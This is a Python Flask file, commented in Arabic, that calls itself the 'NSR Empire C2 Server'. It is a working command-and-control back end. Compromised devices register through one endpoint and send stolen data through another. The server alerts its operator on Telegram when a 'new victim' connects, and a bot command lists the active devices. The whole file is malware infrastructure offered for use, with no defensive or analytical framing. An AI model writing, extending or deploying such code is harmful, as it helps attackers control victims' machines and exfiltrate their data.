import os
import logging
from flask import Flask, request, jsonify
import telebot

# إعداد السجلات لمتابعة الطلبات بدقة
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# استدعاء توكن البوت والآيدي بأمان من متغيرات البيئة على Render
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_ID = os.environ.get('ADMIN_ID', '')

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML') if BOT_TOKEN else None

# تخزين مؤقت للأجهزة المتصلة
connected_devices = {}

@app.route('/')
def index():
    return jsonify({
        "status": "online",
        "system": "NSR Empire C2 Server",
        "version": "7.11"
    }), 200

# نقطة استقبال اتصال الأجهزة والعملاء
@app.route('/api/connect', methods=['POST'])
def agent_connect():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data received"}), 400
        
        device_id = data.get('device_id', 'Unknown')
        connected_devices[device_id] = data
        logger.info(f"Device connected successfully: {device_id}")
        
        # إرسال إشعار فوري عبر بوت التليجرام عند اتصال ضحية جديدة
        if bot and ADMIN_ID:
            bot.send_message(
                ADMIN_ID, 
                f"🚨 <b>اتصال جديد ناجح!</b>\n\n- معرف الجهاز: <code>{device_id}</code>"
            )
        
        return jsonify({"status": "success", "command": "wait"}), 200
    except Exception as e:
        logger.error(f"Error processing connection: {e}")
        return jsonify({"error": str(e)}), 500

# نقطة استقبال تقارير المهام والبيانات المستخرجة
@app.route('/api/report', methods=['POST'])
def agent_report():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No report data"}), 400
            
        device_id = data.get('device_id', 'Unknown')
        task_type = data.get('task_type', 'General')
        content = data.get('content', '')
        
        logger.info(f"Report received from {device_id} [Task: {task_type}]")
        
        if bot and ADMIN_ID:
            bot.send_message(
                ADMIN_ID,
                f"📥 <b>تقرير جديد ({task_type})</b>\n\n- الجهاز: <code>{device_id}</code>\n- المحتوى:\n<code>{str(content)[:3000]}</code>"
            )
            
        return jsonify({"status": "received"}), 200
    except Exception as e:
        logger.error(f"Error processing report: {e}")
        return jsonify({"error": str(e)}), 500

# أوامر بوت التليجرام لإدارة النظام
if bot:
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        bot.reply_to(message, "🤖 <b>مرحباً بك في لوحة تحكم NSR Empire C2</b>\n\nالأوامر المتاحة:\n/devices - عرض الأجهزة المتصلة حالياً")

    @bot.message_handler(commands=['devices'])
    def list_devices(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        if not connected_devices:
            bot.reply_to(message, "⚠️ لا توجد أجهزة متصلة في الذاكرة المؤقتة حالياً.")
            return
            
        msg = "📱 <b>قائمة الأجهزة النشطة:</b>\n\n"
        for dev_id, info in connected_devices.items():
            msg += f"- <code>{dev_id}</code>\n"
        bot.reply_to(message, msg)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
